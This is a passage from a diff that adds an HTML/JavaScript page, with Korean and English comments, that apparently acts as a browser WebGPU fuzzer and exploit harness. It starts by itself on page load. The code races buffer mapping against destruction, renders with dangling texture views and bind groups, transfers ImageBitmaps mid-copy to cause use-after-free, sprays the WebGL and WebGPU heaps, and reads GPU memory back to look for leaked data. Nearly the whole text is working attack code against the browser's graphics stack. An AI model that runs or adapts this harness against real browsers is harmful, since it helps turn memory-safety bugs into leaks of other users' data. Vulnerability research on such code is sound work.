+                        const canMapWrite = (buffer.usage & GPUBufferUsage.MAP_WRITE);
+
+                        if (canMapRead && canMapWrite) { // Can do both, pick randomly
+                            mapMode = Math.random() < 0.5 ? GPUMapMode.READ : GPUMapMode.WRITE;
+                        } else if (canMapRead) {
+                            mapMode = GPUMapMode.READ;
+                        } else if (canMapWrite) {
+                            mapMode = GPUMapMode.WRITE;
+                        } else {
+                            log(`Skipped mapBuffer: Buffer lacks MAP_READ/MAP_WRITE usage.`, 'info');
+                            break;
+                        }
+
+                        try {
+                            // mapAsync 호출과 동시에 다른 스레드에서 destroy를 시도하여 경쟁 조건 유도
+                            await Promise.race([
+                                buffer.mapAsync(mapMode),
+                                new Promise(resolve => setTimeout(() => {
+                                    if (typeof buffer.destroy === 'function') {
+                                        // 버퍼를 destroy하면 mapAsync가 rejected될 가능성 있음
+                                        // cleanupResource will also remove from pool and update memory
+                                        cleanupResource(buffer, 'buffers'); 
+                                        log(`Attempted to destroy buffer during mapAsync race!`, 'info');
+                                    }
+                                    resolve();
+                                }, getRandomInt(0, 5))) // 아주 짧은 시간 후에 destroy 시도
+                            ]);
+                            if (buffer.mapState === 'mapped') {
+                                const data = new Uint8Array(buffer.getMappedRange());
+                                log(`Buffer mapped (size: ${data.length}), then unmapped.`, 'info');
+                                buffer.unmap();
+                            } else {
+                                log(`Buffer map failed or was raced (mapState: ${buffer.mapState}).`, 'info');
+                            }
+                        } catch (e) {
+                            log(`mapAsync/destroy race caught JS error: ${e.message}`, 'error');
+                        }
+                        break;
+                    } // End of 'mapBuffer' case
+                    case 'transferImageBitmap': {
+                        await runImageBitmapUAFAttempt();
+                        break;
+                    } // End of 'transferImageBitmap' case
+                    case 'sprayHeap': {
+                        sprayTheHeap(getRandomInt(256 * 4, 1024 * 1024 * 4), getRandomInt(1000, 2000)); // WebGL 스프레이 양 조절
+                        break;
+                    } // End of 'sprayHeap' case
+                    case 'sprayWebGPUHeap': {
+                        await sprayWebGPUHeap(getRandomInt(256 * 4, 1024 * 1024 * 4), getRandomInt(100, 500)); // WebGPU 스프레이 양 조절
+                        break;
+                    } // End of 'sprayWebGPUHeap' case
+                    case 'raceTextureViewLifecycle': {
+                        // TextureView 또는 BindGroup UAF (Base Texture destroy 후 사용 시도)
+                        const texture = getRandomResource('textures');
+                        if (!texture || !(texture.usage & GPUTextureUsage.RENDER_ATTACHMENT)) { // 렌더 타겟으로 사용 가능한 텍스처가 필요
+                            log(`Skipped raceTextureViewLifecycle: Missing suitable texture for render attachment.`, 'info');
+                            break;
+                        }
+
+                        let textureView = null;
+                        let bindGroup = null;
+
+                        try {
+                            // 텍스처 뷰 생성
+                            textureView = texture.createView();
+                            resourcePools.textureViews.add(textureView);
+                            log(`Created TextureView for race on texture (format: ${texture.format})`, 'info');
+
+                            // 바인딩 그룹 생성 (텍스처 뷰 또는 버퍼 참조)
+                            if (Math.random() < 0.7 && resourcePools.pipelines.size > 0) {
+                                const pipeline = getRandomResource('pipelines');
+                                if (pipeline) {
+                                     let entries = [];
+                                     // 텍스처 뷰를 바인딩 그룹에 포함 시도
+                                     if (textureView && textureView.texture && (textureView.texture.usage & GPUTextureUsage.TEXTURE_BINDING)) { 
+                                         entries.push({
+                                             binding: 0,
+                                             resource: textureView,
+                                         });
+                                     } else { // 텍스처 뷰 사용 불가 시 버퍼라도 사용 시도
+                                        const buffer = getRandomResource('buffers');
+                                        if (buffer && (buffer.usage & (GPUBufferUsage.UNIFORM | GPUBufferUsage.STORAGE))) {
+                                            entries.push({
+                                                binding: 0,
+                                                resource: { buffer: buffer, offset: 0, size: Math.min(buffer.size, 256) },
+                                            });
+                                        }
+                                     }
+
+                                     if (entries.length > 0) {
+                                         try {
+                                            bindGroup = gpuDevice.createBindGroup({
+                                                layout: pipeline.getBindGroupLayout(0),
+                                                entries: entries, 
+                                            });
+                                            resourcePools.bindGroups.add(bindGroup);
+                                            log(`Created BindGroup referencing ${entries.length} resource(s) for race.`, 'info');
+                                        } catch (e) {
+                                            log(`Failed to create BindGroup in race: ${e.message}`, 'error');
+                                            bindGroup = null; 
+                                        }
+                                     }
+                                }
+                            }
+                            
+                            // 원본 텍스처를 파괴하여 Use-After-Free 유도
+                            cleanupResource(texture, 'textures'); 
+                            log(`Destroyed base texture for TextureView/BindGroup race.`, 'info');
+
+                            const racePromise = new Promise(resolve => {
+                                setTimeout(async () => {
+                                    // 힙 스프레이로 해제된 메모리 재할당 시도
+                                    sprayTheHeap(256 * 256 * 4, getRandomInt(5000, 10000)); 
+                                    sprayWebGPUHeap(256 * 256 * 4, getRandomInt(100, 500));
+
+                                    // 파괴된 텍스처의 뷰/바인딩 그룹을 사용 시도
+                                    if (textureView) {
+                                        try {
+                                            const commandEncoder = gpuDevice.createCommandEncoder();
+                                            const renderPassDescriptor = {
+                                                colorAttachments: [{
+                                                    view: textureView, // Dangling TextureView 사용
+                                                    clearValue: { r: 0, g: 0, b: 0, a: 1 },
+                                                    loadOp: 'clear',
+                                                    storeOp: 'store',
+                                                }],
+                                            };
+                                            const passEncoder = commandEncoder.beginRenderPass(renderPassDescriptor);
+                                            passEncoder.end(); 
+                                            gpuDevice.queue.submit([commandEncoder.finish()]);
+                                            log(`Attempted render with dangling TextureView.`, 'info');
+                                        } catch (e) {
+                                            log(`Caught JS error using dangling TextureView: ${e.message}`, 'error');
+                                        }
+                                    }
+                                    if (bindGroup && resourcePools.pipelines.size > 0) {
+                                        const pipeline = getRandomResource('pipelines');
+                                        const anyTextureForRender = getRandomResource('textures'); // 렌더 타겟으로 쓸 아무 텍스처
+                                        if (pipeline && anyTextureForRender && (anyTextureForRender.usage & GPUTextureUsage.RENDER_ATTACHMENT)) {
+                                            try {
+                                                const commandEncoder = gpuDevice.createCommandEncoder();
+                                                const renderPassDescriptor = {
+                                                    colorAttachments: [{
+                                                        view: anyTextureForRender.createView(),
+                                                        clearValue: { r: 0, g: 0, b: 0, a: 1 },
+                                                        loadOp: 'clear',
+                                                        storeOp: 'store',
+                                                    }],
+                                                };
+                                                const passEncoder = commandEncoder.beginRenderPass(renderPassDescriptor);
+                                                passEncoder.setPipeline(pipeline);
+                                                passEncoder.setBindGroup(0, bindGroup); // Dangling BindGroup 사용
+                                                passEncoder.draw(3);
+                                                passEncoder.end();
+                                                gpuDevice.queue.submit([commandEncoder.finish()]);
+                                                log(`Attempted render with dangling BindGroup.`, 'info');
+                                            } catch (e) {
+                                                log(`Caught JS error using dangling BindGroup: ${e.message}`, 'error');
+                                            }
+                                        }
+                                    }
+                                    resolve();
+                                }, getRandomInt(0, 20)); 
+                            }); 
+                            await racePromise;
+                            await gpuDevice.queue.onSubmittedWorkDone(); // 모든 GPU 작업 완료 대기
+                        } catch (e) {
+                            log(`Caught JS error in TextureView/BindGroup lifecycle race: ${e.message}`, 'error');
+                        } finally {
+                            // dangling 뷰/바인딩 그룹은 여기서 바로 cleanup하지 않고 GC에 맡기거나, 
+                            // 다음 번 리소스 정리 때 처리되도록 함 (더 많은 UAF 기회)
+                        }
+                        break;
+                    } // End of 'raceTextureViewLifecycle' case
+                    case 'leakViaCreateImageBitmap': {
+                        const sourceTexture = getRandomResource('textures');
+                        if (!sourceTexture) {
+                            log(`Skipped leakViaCreateImageBitmap: No source texture available.`, 'info');
+                            break;
+                        }
+
+                        // MODIFIED: Check for COPY_SRC specifically for the copy operation
+                        if (!(sourceTexture.usage & GPUTextureUsage.COPY_SRC)) {
+                             log(`Skipped leakViaCreateImageBitmap: Source texture lacks COPY_SRC usage.`, 'info');
+                             break;
+                        }
+                        
+                        let leakedBitmap = null;
+                        let tempBuffer = null;
+                        try {
+                            log(`Attempting leak via createImageBitmap from texture... (indirect method)`, 'info');
+                            
+                            // Step 1: Copy texture data to a mappable buffer
+                            // Ensure buffer usage is COPY_DST and MAP_READ
+                            const textureWidth = sourceTexture.width;
+                            const textureHeight = sourceTexture.height;
+                            const bytesPerPixel = 4; // Assuming rgba8unorm
+                            // MODIFIED: Ensure bytesPerRow is a multiple of 256 for the copy
+                            const alignedBytesPerRow = Math.ceil(textureWidth * bytesPerPixel / 256) * 256;
+                            const bufferSize = alignedBytesPerRow * textureHeight; 
+
+                            tempBuffer = gpuDevice.createBuffer({
+                                size: bufferSize,
+                                usage: GPUBufferUsage.COPY_DST | GPUBufferUsage.MAP_READ,
+                            });
+
+                            const commandEncoder = gpuDevice.createCommandEncoder();
+                            commandEncoder.copyTextureToBuffer(
+                                { texture: sourceTexture },
+                                { buffer: tempBuffer, bytesPerRow: alignedBytesPerRow, rowsPerImage: textureHeight }, 
+                                { width: textureWidth, height: textureHeight, depthOrArrayLayers: 1 }
+                            );
+                            gpuDevice.queue.submit([commandEncoder.finish()]);
+                            await gpuDevice.queue.onSubmittedWorkDone();
+
+                            // Step 2: Map the buffer and get data
+                            await tempBuffer.mapAsync(GPUMapMode.READ);
+                            const pixelData = new Uint8Array(tempBuffer.getMappedRange());
+
+                            // Step 3: Create ImageData from pixel data
+                            // Note: ImageData expects tightly packed data, so we might need to copy
+                            // if alignedBytesPerRow != textureWidth * bytesPerPixel
+                            let finalPixelData;
+                            if (alignedBytesPerRow === textureWidth * bytesPerPixel) {
+                                finalPixelData = pixelData;
+                            } else {
+                                // Create a new array and copy row by row
+                                finalPixelData = new Uint8Array(textureWidth * textureHeight * bytesPerPixel);
+                                for (let y = 0; y < textureHeight; ++y) {
+                                    const srcOffset = y * alignedBytesPerRow;
+                                    const dstOffset = y * textureWidth * bytesPerPixel;
+                                    finalPixelData.set(pixelData.subarray(srcOffset, srcOffset + textureWidth * bytesPerPixel), dstOffset);
+                                }
+                            }
+
+                            const imageData = new ImageData(new Uint8ClampedArray(finalPixelData.buffer, finalPixelData.byteOffset, finalPixelData.byteLength), textureWidth, textureHeight);
+
+                            // Step 4: Create ImageBitmap from ImageData
+                            leakedBitmap = await createImageBitmap(imageData); 
+
+                            outputCanvasCtx.clearRect(0, 0, outputCanvas.width, outputCanvas.height);
+                            outputCanvasCtx.drawImage(leakedBitmap, 0, 0); // 캔버스에 그리기
+                            
+                            // 캔버스에서 픽셀 데이터 읽어오기 (redundant but confirms canvas content)
+                            const finalLeakData = outputCanvasCtx.getImageData(0, 0, outputCanvas.width, outputCanvas.height).data;
+                            processLeakData(finalLeakData, 'leakViaCreateImageBitmap (converted)');
+
+                        } catch (e) {
+                            log(`Caught JS error during leakViaCreateImageBitmap: ${e.message}`, 'error');
+                        } finally {
+                            if (leakedBitmap) leakedBitmap.close(); 
+                            if (tempBuffer) {
+                                try { tempBuffer.unmap(); } catch (e) { /* silent */ }
+                                tempBuffer.destroy();
+                                // No estimatedGPUMemory update here, as it's a temporary buffer
+                                // and its size was not added to the total.
+                            }
+                        }
+                        break;
+                    } // End of 'leakViaCreateImageBitmap' case
+                    default:
+                        log(`Unknown action: ${action}`, 'error');
+                }
+            } catch (e) {
+                log(`Caught JS error during ${action}: ${e.message}`, 'error');
+            }
+            await new Promise(resolve => setTimeout(resolve, getRandomInt(10, 100))); // 다음 동작 전 짧은 지연
+        };
+
+        /** ImageBitmap UAF Attempt (Integrated) **/
+        async function runImageBitmapUAFAttempt() {
+            log(`Starting ImageBitmap UAF attempt (Attempt: ${attemptCounter})`, 'running');
+            let bitmap = null;
+            let destTexture = null;
+            let readbackBuffer = null;
+
+            try {
+                // 특정 패턴으로 채워진 ImageBitmap 생성
+                bitmap = await createImageBitmapFromSource(256, 256); 
+                
+                // WebGPU 텍스처 생성: ImageBitmap 복사 대상 및 읽기 버퍼로 복사될 소스
+                destTexture = gpuDevice.createTexture({
+                    size: [bitmap.width, bitmap.height], format: 'rgba8unorm',
+                    usage: GPUTextureUsage.COPY_DST | GPUTextureUsage.TEXTURE_BINDING | GPUTextureUsage.COPY_SRC | GPUTextureUsage.RENDER_ATTACHMENT 
+                });
+                estimatedGPUMemory += (bitmap.width * bitmap.height * 4); // Estimate for destTexture as well
+                updateEstimatedGpuMemoryDisplay();
+
+                // 텍스처에서 CPU로 데이터를 읽어올 버퍼
+                // MODIFIED: Ensure readbackBuffer size is calculated with aligned bytesPerRow
+                const readbackBufferSize = Math.ceil(destTexture.width * 4 / 256) * 256 * destTexture.height;
+
+                readbackBuffer = gpuDevice.createBuffer({
+                    size: readbackBufferSize,
+                    usage: GPUBufferUsage.COPY_DST | GPUBufferUsage.MAP_READ
+                });
+                estimatedGPUMemory += readbackBufferSize; // Update estimated memory
+                updateEstimatedGpuMemoryDisplay();
+
+
+                const racePromise = new Promise(resolve => {
+                    const doRaceActions = () => {
+                        if (!worker || !bitmap) { resolve(); return; } 
+
+                        // 워커로 ImageBitmap 전송 (원본 메인 스레드 참조를 null로 만들고 GC 대상이 되도록 유도)
+                        worker.postMessage({ type: 'detachBitmap', bitmap }, [bitmap]);
+                        bitmap = null; // 메인 스레드에서 참조 제거
+                        
+                        // 힙 스프레이를 통해 해제된 메모리 재할당 시도
+                        sprayTheHeap(256 * 256 * 4, getRandomInt(5000, 10000)); 
+                        // sprayWebGPUHeap은 이제 자체적으로 유효한 usage를 갖도록 수정되었음.
+                        sprayWebGPUHeap(256 * 256 * 4, getRandomInt(100, 500)); 
+                        resolve(); 
+                    };
+
+                    if (typeof gc === 'function') { // --expose-gc 플래그가 있는 경우
+                        gc(); // 명시적 GC 호출 시도
+                        requestAnimationFrame(() => { // 렌더링 프레임 이후에 GC가 실행될 기회를 주고,
+                            setTimeout(doRaceActions, getRandomInt(0, 2)); // 바로 이어서 경쟁 작업 수행
+                        });
+                    } else {
+                        // gc() 함수가 없는 경우: 자연 GC에 의존하거나, 
+                        // 간단한 비동기 작업으로 GC를 유도할 시간을 줌
+                        setTimeout(doRaceActions, getRandomInt(0, 2)); 
+                    }
+                });
+
+                // ImageBitmap을 WebGPU 텍스처로 복사 (이 시점에 UAF 발생 가능)
+                const webgpuCopyPromise = gpuDevice.queue.copyExternalImageToTexture(
+                    { source: bitmap }, // 여기에서 bitmap이 dangling 상태일 수 있음
+                    { texture: destTexture }, 
+                    { width: destTexture.width, height: destTexture.height, depthOrArrayLayers: 1 }
+                );
+
+                // 복사 명령과 경쟁 조건 유도 작업을 동시에 수행하고 완료 대기
+                await Promise.allSettled([webgpuCopyPromise, racePromise]);
+                await gpuDevice.queue.onSubmittedWorkDone(); // 모든 GPU 작업 완료 대기
+                
+                // 텍스처에서 버퍼로 복사 (GPU -> GPU)
+                const commandEncoder = gpuDevice.createCommandEncoder();
+                // MODIFIED: Use aligned bytesPerRow for copyTextureToBuffer
+                const alignedBytesPerRowForReadback = Math.ceil(destTexture.width * 4 / 256) * 256;
+                commandEncoder.copyTextureToBuffer(
+                    { texture: destTexture },
+                    { buffer: readbackBuffer, bytesPerRow: alignedBytesPerRowForReadback, rowsPerImage: destTexture.height },
+                    { width: destTexture.width, height: destTexture.height, depthOrArrayLayers: 1 }
+                );
+                gpuDevice.queue.submit([commandEncoder.finish()]);
+                await gpuDevice.queue.onSubmittedWorkDone(); // 복사 완료 대기
+                
+                // 버퍼 매핑 및 데이터 읽기 (GPU -> CPU)
+                await readbackBuffer.mapAsync(GPUMapMode.READ);
+                const leakData = new Uint8Array(readbackBuffer.getMappedRange());
+                
+                // MODIFIED: Adjust for aligned bytesPerRow when creating ImageData
+                let finalLeakDataForCanvas;
+                if (alignedBytesPerRowForReadback === destTexture.width * 4) {
+                    finalLeakDataForCanvas = leakData;
+                } else {
+                    finalLeakDataForCanvas = new Uint8Array(destTexture.width * destTexture.height * 4);
+                    for (let y = 0; y < destTexture.height; ++y) {
+                        const srcOffset = y * alignedBytesPerRowForReadback;
+                        const dstOffset = y * destTexture.width * 4;
+                        finalLeakDataForCanvas.set(leakData.subarray(srcOffset, srcOffset + destTexture.width * 4), dstOffset);
+                    }
+                }
+
+                // 읽어온 데이터를 캔버스에 그려 시각적으로 확인
+                const imageData = new ImageData(new Uint8ClampedArray(finalLeakDataForCanvas.buffer, finalLeakDataForCanvas.byteOffset, finalLeakDataForCanvas.byteLength), destTexture.width, destTexture.height);
+                outputCanvasCtx.putImageData(imageData, 0, 0); 
+
+                // 유출 데이터 분석
+                processLeakData(leakData, 'ImageBitmapUAF'); // Using raw leakData for pattern check
+
+            } catch (e) {
+                log(`Caught JS error during ImageBitmap UAF attempt: ${e.message}`, 'error');
+            } finally {
+                // 사용된 WebGPU 리소스 정리
+                if (destTexture) {
+                    estimatedGPUMemory -= (destTexture.width * destTexture.height * 4);
+                    destTexture.destroy();
+                }
+                if (readbackBuffer) {
+                    estimatedGPUMemory -= readbackBuffer.size;
+                    try { readbackBuffer.unmap(); } catch (e) { /* silent */ } // 매핑 해제
+                    readbackBuffer.destroy();
+                }
+                estimatedGPUMemory = Math.max(0, estimatedGPUMemory);
+                updateEstimatedGpuMemoryDisplay();
+
+                // WebGL 스프레이 버퍼 정리
+                if (gl) {
+                    for (const buf of sprayObjects) { gl.deleteBuffer(buf); } 
+                    sprayObjects.length = 0;
+                }
+            }
         }
+
+        /** Fuzzer Loop Control **/
+        async function fuzzLoopIteration() {
+            if (leakDetected) {
+                stopFuzzing();
+                return;
+            }
+            attemptCounter++;
+            log(`Fuzzing iteration: ${attemptCounter}`, 'running');
+            await performRandomWebGPUAction();
+        }
+        
+        function startFuzzing() {
+            if (fuzzIntervalId) return; // 이미 실행 중이면 중복 실행 방지
+            runBtn.disabled = true;
+            stopBtn.disabled = false;
+            attemptCounter = 0;
+            leakDetected = false;
+            partialLeakCount = 0;
+            uniqueLeakPatterns.clear();
+            estimatedGPUMemory = 0; // Reset estimated memory
+            updateEstimatedGpuMemoryDisplay();
+
+            // 워커 초기화 (한 번만 생성)
+            if (!worker) {
+                workerBlobUrl = URL.createObjectURL(new Blob([workerScript], { type: 'application/javascript' }));
+                worker = new Worker(workerBlobUrl);
+            }
+            log("Starting fuzzing...", 'running');
+            fuzzIntervalId = setInterval(fuzzLoopIteration, 100); // 100ms 간격으로 퍼징 반복
+        }
+
+        function stopFuzzing() {
+            if (fuzzIntervalId) {
+                clearInterval(fuzzIntervalId);
+                fuzzIntervalId = null;
+            }
+            runBtn.disabled = false;
+            stopBtn.disabled = true;
+            if (!leakDetected) {
+                log(`Fuzzing stopped after ${attemptCounter} iterations. No 'CCCC...' leak detected. (Total partial leaks: ${partialLeakCount}, Unique: ${uniqueLeakPatterns.size})`, 'info');
+            }
+            
+            // 모든 리소스 풀을 돌며 리소스 정리
+            for (const type in resourcePools) {
+                // Using Array.from to iterate over a copy, as cleanupResource modifies the original Set
+                Array.from(resourcePools[type]).forEach(res => { 
+                    cleanupResource(res, type);
+                });
+                resourcePools[type].clear(); // 풀 비우기 (already done by cleanupResource, but ensures emptiness)
+            }
+            // WebGL 버퍼 정리
+            if (gl) {
+                for (const buf of sprayObjects) { gl.deleteBuffer(buf); }
+                sprayObjects.length = 0;
+            }
+            // 워커 종료 및 URL 해제
+            if (worker) {
+                worker.terminate();
+                worker = null;
+                URL.revokeObjectURL(workerBlobUrl);
+            }
+            estimatedGPUMemory = 0; // Final reset
+            updateEstimatedGpuMemoryDisplay();
+            log("Fuzzer resources cleaned up.", 'info');
+        }
+
+        /** Initialization Function **/
+        async function initialize() {
+            try {
+                // WebGPU 초기화
+                if (!navigator.gpu) {
+                    log("WebGPU not supported in this browser.", 'error');
+                    return;
+                }
+                const adapter = await navigator.gpu.requestAdapter();
+                if (!adapter) {
+                    log("No WebGPU adapter found.", 'error');
+                    return;
+                }
+                gpuDevice = await adapter.requestDevice();
+                if (!gpuDevice) {
+                    log("No WebGPU device found.", 'error');
+                    return;
+                }
+
+                // WebGPU device lost 이벤트 리스너
+                gpuDevice.lost.then((info) => {
+                    log(`WebGPU device lost! Type: ${info.reason}, Message: ${info.message}`, 'failure');
+                    stopFuzzing();
+                    // 필요하다면 여기서 다시 initialize() 호출하여 복구 시도 가능
+                });
+                
+                log("WebGPU device initialized successfully.", 'success');
+
+                // WebGL2 컨텍스트 초기화 (힙 스프레이용)
+                const tempCanvas = document.createElement('canvas');
+                gl = tempCanvas.getContext('webgl2', {
+                    alpha: false,
+                    depth: false,
+                    stencil: false,
+                    antialias: false,
+                    preserveDrawingBuffer: false,
+                    failIfMajorPerformanceCaveat: true
+                });
+
+                if (!gl) {
+                    log("WebGL2 not available for heap spraying.", 'error');
+                } else {
+                    log("WebGL2 context initialized successfully.", 'success');
+                }
+
+                runBtn.disabled = false;
+                log("Ready to fuzz. Click 'Start Fuzzing Loop'.", 'info');
+                updateEstimatedGpuMemoryDisplay(); // Initial display of 0 bytes
+
+                // --- Dawn D3D11 Backend Tracing Note ---
+                log("NOTE: Direct tracing of internal Dawn D3D11 'DestroyImpl()' / 'Release()' from JavaScript is not possible due to browser security models. This fuzzer maximizes resource churn, which encourages such calls. Monitor `chrome://gpu` and browser logs for low-level details.", 'info');
+
+                // MODIFIED: Automatically start fuzzing after initialization is complete
+                startFuzzing();
+
+            } catch (e) {
+                log(`Failed to initialize WebGPU or WebGL: ${e.message}`, 'error');
+            }
+        }
+
+        window.onload = initialize;
     </script>
 </body>
 </html>
